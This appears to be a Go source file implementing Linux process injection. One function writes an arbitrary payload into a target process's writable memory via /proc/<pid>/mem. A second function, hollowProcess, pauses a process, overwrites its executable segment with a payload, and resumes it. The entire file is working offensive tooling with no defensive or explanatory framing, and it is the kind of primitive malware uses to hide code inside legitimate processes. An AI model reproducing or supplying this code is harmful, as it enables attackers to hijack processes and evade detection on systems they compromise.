package memexec

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"

	"golang.org/x/sys/unix"
)

func injectProcMem(pid int, payload []byte) error {
	addr, err := findWritableSegment(pid, len(payload))
	if err != nil {
		return fmt.Errorf("find writable segment: %w", err)
	}

	memPath := fmt.Sprintf("/proc/%d/mem", pid)
	f, err := os.OpenFile(memPath, os.O_WRONLY, 0)
	if err != nil {
		return fmt.Errorf("open %s: %w", memPath, err)
	}
	defer f.Close()

	if _, err := f.WriteAt(payload, int64(addr)); err != nil {
		return fmt.Errorf("write at 0x%x: %w", addr, err)
	}

	return nil
}

func findWritableSegment(pid int, size int) (uintptr, error) {
	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
	f, err := os.Open(mapsPath)
	if err != nil {
		return 0, fmt.Errorf("open maps: %w", err)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}

		perms := fields[1]
		if !strings.Contains(perms, "w") {
			continue
		}

		addrs := strings.Split(fields[0], "-")
		if len(addrs) != 2 {
			continue
		}

		start, err := strconv.ParseUint(addrs[0], 16, 64)
		if err != nil {
			continue
		}
		end, err := strconv.ParseUint(addrs[1], 16, 64)
		if err != nil {
			continue
		}

		segSize := end - start
		if int(segSize) >= size {
			return uintptr(start), nil
		}
	}

	return 0, fmt.Errorf("no writable segment large enough for %d bytes", size)
}

func hollowProcess(pid int, payload []byte) error {
	if err := unix.Kill(pid, unix.SIGSTOP); err != nil {
		return fmt.Errorf("SIGSTOP pid %d: %w", pid, err)
	}

	textAddr, err := findExecutableSegment(pid)
	if err != nil {
		_ = unix.Kill(pid, unix.SIGCONT)
		return fmt.Errorf("find .text: %w", err)
	}

	memPath := fmt.Sprintf("/proc/%d/mem", pid)
	f, err := os.OpenFile(memPath, os.O_WRONLY, 0)
	if err != nil {
		_ = unix.Kill(pid, unix.SIGCONT)
		return fmt.Errorf("open mem: %w", err)
	}

	if _, err := f.WriteAt(payload, int64(textAddr)); err != nil {
		f.Close()
		_ = unix.Kill(pid, unix.SIGCONT)
		return fmt.Errorf("write .text: %w", err)
	}
	f.Close()

	if err := unix.Kill(pid, unix.SIGCONT); err != nil {
		return fmt.Errorf("SIGCONT pid %d: %w", pid, err)
	}

	return nil
}

func findExecutableSegment(pid int) (uintptr, error) {
	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
	f, err := os.Open(mapsPath)
	if err != nil {
		return 0, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}

		perms := fields[1]
		if !strings.Contains(perms, "x") {
			continue
		}

		addrs := strings.Split(fields[0], "-")
		if len(addrs) != 2 {
			continue
		}

		start, err := strconv.ParseUint(addrs[0], 16, 64)
		if err != nil {
			continue
		}

		return uintptr(start), nil
	}

	return 0, fmt.Errorf("no executable segment found")
}
